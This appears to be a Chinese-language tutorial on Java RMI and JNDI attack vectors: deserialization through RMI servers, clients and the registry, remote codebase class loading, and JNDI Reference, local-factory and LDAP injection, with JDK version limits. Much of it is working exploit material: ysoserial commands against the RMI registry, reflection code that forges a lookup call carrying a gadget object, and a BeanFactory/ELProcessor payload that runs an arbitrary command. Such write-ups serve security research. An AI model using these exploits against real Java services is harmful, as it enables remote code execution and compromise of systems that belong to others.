# RMI和JNDI攻击向量

# RMI攻击向量

## 客户端攻击服务端

**情况1：**
假设服务端存在一个公共的已知PublicKnown类（比如经典的Apache Common Collection，这里只是用PublicKnown做一个类比），它有readObject方法并且在readObject中存在命令执行的能力，所以我们客户端可以写一个与服务端包名，类名相同的类并继承Message类，通过远程函数调用传递恶意对象到服务端。

**情况2：**
通过Java RMI远程类加载攻击服务端。对于服务端而言，如果客户端传递的方法参数是远程对象接口方法参数类型的子类，那么服务端需要从客户端提供的java.rmi.server.codebaseURL去加载对应的类。

无论是客户端还是服务端要远程加载类，都需要满足以下条件：

* 由于Java SecurityManager的限制，默认是不允许远程加载的，如果需要进行远程加载类，需要安装RMISecurityManager并且配置java.security.policy，这在后面的利用中可以看到。
* 属性 java.rmi.server.useCodebaseOnly 的值必需为false。但是从JDK 6u45、7u21开始，java.rmi.server.useCodebaseOnly 的默认值就是true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前虚拟机的java.rmi.server.codebase 指定路径加载类文件。使用这个属性来防止虚拟机从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。
```java
    //如果需要使用RMI的动态加载功能，需要开启RMISecurityManager，并配置policy以允许从远程加载类库
    System.setProperty("java.security.policy", RMIServer.class.getClassLoader().getResource("java.policy").getFile());
    RMISecurityManager securityManager = new RMISecurityManager();
    System.setSecurityManager(securityManager);
    //但是从JDK 6u45、7u21开始，java.rmi.server.useCodebaseOnly 的默认值就是true。当该值为true时，将禁用自动加载远程类文件,
    System.setProperty("java.rmi.server.useCodebaseOnly","false");
```
```
java.policy
// Standard extensions get all permissions by default

grant {
	permission java.security.AllPermission;
};

```

## 服务端攻击客户端

**情况1：**
服务端如果想要攻击客户端，那么利用点就是存在客户端反序列化服务端的返回值的时候，即客户端存在公共的已知PublicKnown类（比如经典的Apache Common Collection，这里只是用PublicKnown做一个类比），它有readObject方法并且在readObject中存在命令执行的能力，服务端通过返回值返回序列化的PublicKnown类型的对象。

**情况2：**
通过Java RMI远程类加载攻击服务端。对于客户端而言，如果服务端返回的对象为远程接口方法返回对象的子类，那么客户端需要从服务端提供的java.rmi.server.codebaseURL去加载对应的类。
```java
 //设置java.rmi.server.codebase,客户端从codebase加载远程类
System.setProperty("java.rmi.server.codebase", "http://127.0.0.1:8000/");
Registry reg;
try {
        // 创建Registry
        reg = LocateRegistry.createRegistry(9999);
        System.out.println("java RMI registry created. port on 9999...");
    } catch (Exception e) {
        System.out.println("Using existing registry");
        reg = LocateRegistry.getRegistry();
    }
    //绑定远程对象到Registry
reg.bind("Services", services);
......
```
和客户端攻击服务端一样，需要客户端打开安全设置，允许远程加载类。
```java
    //如果需要使用RMI的动态加载功能，需要开启RMISecurityManager，并配置policy以允许从远程加载类库
    System.setProperty("java.security.policy", RMIServer.class.getClassLoader().getResource("java.policy").getFile());
    RMISecurityManager securityManager = new RMISecurityManager();
    System.setSecurityManager(securityManager);
    //但是从JDK 6u45、7u21开始，java.rmi.server.useCodebaseOnly 的默认值就是true。当该值为true时，将禁用自动加载远程类文件,
    System.setProperty("java.rmi.server.useCodebaseOnly","false");
```

## 攻击注册中心
```java
(1) 利用DGC攻击RMI Registry，可以通过与DGC通信的方式发送恶意payload让注册中心反序列化
java -cp ysoserial-all.jar ysoserial.exploit.JRMPClient 127.0.0.1 9999 
CommonsCollections6 "calc"
```
```java
(2) 利用bind/rebind请求攻击RMI Registry (JDK版本必须在8u141之前)

java -cp ysoserial-all.jar ysoserial.exploit.RMIRegistryExploit 127.0.0.1 9999 CommonsCollections6 "calc" (PS: jdk<8u121)

服务端也是可以向注册中心序列化传输远程对象,那么直接把远程对象改成反序列化Gadget看下。从Client接收到的bind或rebind的remote obj，将由sun/rmi/registry/RegistryImpl_Skel.java#dispatch处理，获取到的序列化数据直接调用了readObject函数，导致了常规的Java反序列化漏洞的触发。这里我们只需要写一个bind或rebind的操作，即可攻击到RMI Registry。

其他：(PS:jdk<8u232_b09)
// 开启JRMPListener
java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 8888 CommonsCollections6 "calc"
// 发起攻击
java -cp target/ysoserial-all.jar ysoserial.exploit.RMIRegistryExploit2 127.0.0.1 1099 jrmphost 8888
或者java -cp target/ysoserial-all.jar ysoserial.exploit.RMIRegistryExploit3 127.0.0.1 1099 jrmphost 8888

Registry对于bind/rebind的请求，会去检查这个请求是否为本地请求，对于外部的请求，Registry会拒绝该请求,所以如果要使用bind/rebind请求来远程攻击Registry，JDK版本必须在8u141之前
```
```java
(3) 利用unbind/lookup请求攻击RMI Registry (绕过JDK版本必须在8u141之前的限制，PS :　JDK>=8u232_b09 &&　JDK<=8u242，大于8u242的条件下也失效了，主要原因在于lookup接口无法再反序列化非string类型的object了)
unbind和lookup实际上都会调用readObject来读取传递过来的参数，所以同样是可以利用的。

不过这里有一个问题，当我们调用unbind或者lookup时，只允许我们传递字符串，所以没法传递我们的恶意对象。

这个问题要解决有几种办法：

* 伪造连接请求
* rasp hook请求代码，修改发送数据
我用的是第一种，也是比较简单的一种，直接通过反射就能实现。

ObjectPayload payloadObj = payloadClass.newInstance();
Object payload = payloadObj.getObject(command);
String name = "pwned" + System.nanoTime();
Remote remote = Gadgets.createMemoitizedProxy(Gadgets.createMap(name, payload), Remote.class);

// 获取ref
Field[] fields_0 = registry.getClass().getSuperclass().getSuperclass().getDeclaredFields();
fields_0[0].setAccessible(true);
UnicastRef ref = (UnicastRef) fields_0[0].get(registry);

//获取operations
Field[] fields_1 = registry.getClass().getDeclaredFields();
fields_1[0].setAccessible(true);
Operation[] operations = (Operation[]) fields_1[0].get(registry);

// 模拟lookup的调用代码，传递可序列化的Object类型
RemoteCall var2 = ref.newCall((RemoteObject) registry, operations, 2, 4905912898345647071L);
ObjectOutput var3 = var2.getOutputStream();
var3.writeObject(remote);
ref.invoke(var2);

利用方式：
//开启JRMPListener
java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 8888 CommonsCollections6 "calc"
//发起攻击
java -cp ysoserial-all.jar ysoserial.exploit.RMIRegistryExploit4 127.0.0.1 1099 CommonsCollections6 "calc"
或
java -cp ysoserial-all.jar ysoserial.exploit.RMIRegistryExploit5 127.0.0.1 1099 RMIConnectWrapped 127.0.0.1:8888
或
java -cp ysoserial-all.jar ysoserial.exploit.RMIRegistryExploit5 127.0.0.1 1099 RMIConnectWithUnicastRemoteObject 127.0.0.1:8888
```

# JDNI攻击向量
JNDI (Java Naming and Directory Interface) ，包括Naming Service和Directory Service。JNDI是Java API，允许客户端通过名称发现和查找数据、对象。这些对象可以存储在不同的命名或目录服务中，例如远程方法调用（RMI），公共对象请求代理体系结构（CORBA），轻型目录访问协议（LDAP）或域名服务（DNS）。总的来说，JNDI是一个接口，在这个接口下会有多种目录系统服务的实现，我们能通过名称等去找到相关的对象，并把它下载到客户端中来。

## JNDI Reference攻击向量：加载远程类
RMIReferenceServer.java
```java
Registry registry = LocateRegistry.createRegistry(9999);
System.out.println("java RMI registry created. port on 9999...");
Reference refObj = new Reference("Calc", "com.test.remoteclass.Calc", "http://127.0.0.1:8000/");
ReferenceWrapper refObjWrapper = new ReferenceWrapper(refObj);
registry.bind("refObj", refObjWrapper);
```
RMIReferenceClient.java
```java
//System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");
//System.setProperty("com.sun.jndi.cosnaming.object.trustURLCodebase","true");
//System.setProperty("java.rmi.server.useCodebaseOnly","false");
Context ctx = new InitialContext();
DirContext dirc = new InitialDirContext();
ctx.lookup("rmi://localhost:9999/refObj");
```
不过在JDK 6u132、JDK 7u122、JDK 8u113 之后，系统属性 com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase 的默认值变为false，即默认不允许RMI、cosnaming从远程的Codebase加载Reference工厂类。

## JNDI Reference攻击向量：利用本地Class作为Reference Factory
在高版本中（如：JDK8u191以上版本）虽然不能从远程加载恶意的Factory，但是我们依然可以在返回的Reference中指定Factory Class，这个工厂类必须在受害目标本地的CLASSPATH中。工厂类必须实现 javax.naming.spi.ObjectFactory 接口，并且至少存在一个 getObjectInstance() 方法。org.apache.naming.factory.BeanFactory 刚好满足条件并且存在被利用的可能。org.apache.naming.factory.BeanFactory 存在于Tomcat依赖包中，所以使用也是非常广泛。
```java
  /** Payload2: Exploit with JNDI Reference with local factory Class **/
ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
ref.add(new StringRefAddr("forceString", "KINGX=eval"));
//String arg = "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','/c','%s']).start()\")";
String arg2 = "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"java.lang.Runtime.getRuntime().exec('%s')\")";
String newArg = String.format(arg2,cmd);
ref.add(new StringRefAddr("KINGX", newArg));

ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);
registry.bind(refName, referenceWrapper);
System.out.println(referenceWrapper.getReference());
```
```java
首先启动JNDI Reference：
java -classpath ysoserial.jar server.RMIServer -rh 127.0.0.1 -rp 8080 -lh 127.0.0.1 -lp 43657 -f local -n Exploit -cmd calc.exe
//无需设置com.sun.jndi.rmi.object.trustURLCodebase=true
Context ctx = new InitialContext();
DirContext dirc = new InitialDirContext();
ctx.lookup("rmi://127.0.0.1:43657/Exploit");
```
## JNDI LDAP攻击向量：加载远程类
* 攻击者为易受攻击的JNDI查找方法提供了一个绝对的LDAP URL
* 服务器连接到由攻击者控制的LDAP服务器，该服务器返回恶意JNDI 引用
* 服务器解码JNDI引用
* 服务器从攻击者控制的服务器获取Factory类
* 服务器实例化Factory类
* 有效载荷得到执行

```java
1、 启动远程codebase HTTPServer,端口8000
2、 启动LdapServer
java -classpath ysoserial.jar server.LDAPServer -rh 127.0.0.1 -rp 8080 -lp 43658 -f remote -p null -n com.test.remoteclass.Calc -cmd calc.exe
```
```java
System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");
Context ctx = new InitialContext();
Object object =  ctx.lookup("ldap://127.0.0.1:43658/com.test.remoteclass.Calc");
```
这种方式在Oracle JDK 11.0.1、8u191、7u201、6u211之后 com.sun.jndi.ldap.object.trustURLCodebase属性默认为false时不允许远程加载类了

## JNDI LDAP攻击向量：利用LDAP返回序列化数据，触发本地Gadget
JNDI也可以与LDAP目录服务进行交互，Java对象在LDAP目录中也有多种存储形式：
* Java序列化
* JNDI Reference
* Marshalled对象
* Remote Location (已弃用)

LDAP可以为存储的Java对象指定多种属性：
* javaCodeBase
* objectClass
* javaFactory
* javaSerializedData

LDAP Server除了使用JNDI Reference进行利用之外，还支持直接返回一个对象的序列化数据。如果Java对象的 javaSerializedData 属性值不为空，则客户端的 obj.decodeObject() 方法就会对这个字段的内容进行反序列化。
```java
final ObjectPayload payload = payloadClass.newInstance();
final Object object = payload.getObject(this.cmd);
byte javaSerializedData[] = Serializer.serialize(object);
ObjectPayload.Utils.releasePayload(payload, object);
// java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections6 '/Applications/Calculator.app/Contents/MacOS/Calculator'|base64
e.addAttribute("javaSerializedData", javaSerializedData);
.......
```
利用测试：
```sh
java -classpath ysoserial.jar server.LDAPServer -rh 127.0.0.1 -rp 8000 -lp 43658 -f local -p CommonsCollections6 -n com.longofo.remoteclass.Calc -cmd calc.exe

//System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true"); // 无需开启远程加载
Context ctx = new InitialContext();
Object object =  ctx.lookup("ldap://127.0.0.1:43658/com.longofo.remoteclass.Calc");
```

## 参考文章
https://blog.0kami.cn/2020/02/06/java/rmi-registry-security-problem/<br>
https://blog.cfyqy.com/article/154071ea.html<br>
https://paper.seebug.org/1091/#serverrmi-server<br>
https://xz.aliyun.com/t/7079<br>
https://xz.aliyun.com/t/7264<br>
http://www.codersec.net/2018/09/%E4%B8%80%E6%AC%A1%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91rmi%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%B7%B1%E6%80%9D/<br>
https://paper.seebug.org/1194/#_8<br>
https://paper.seebug.org/1420/#_3<br>
【RMI利用报错回显】https://xz.aliyun.com/t/2223<br>
【hook替换string参数为object】https://paper.seebug.org/1194/#objectjep290<br>
【如何绕过高版本JDK的限制进行JNDI注入利用】https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html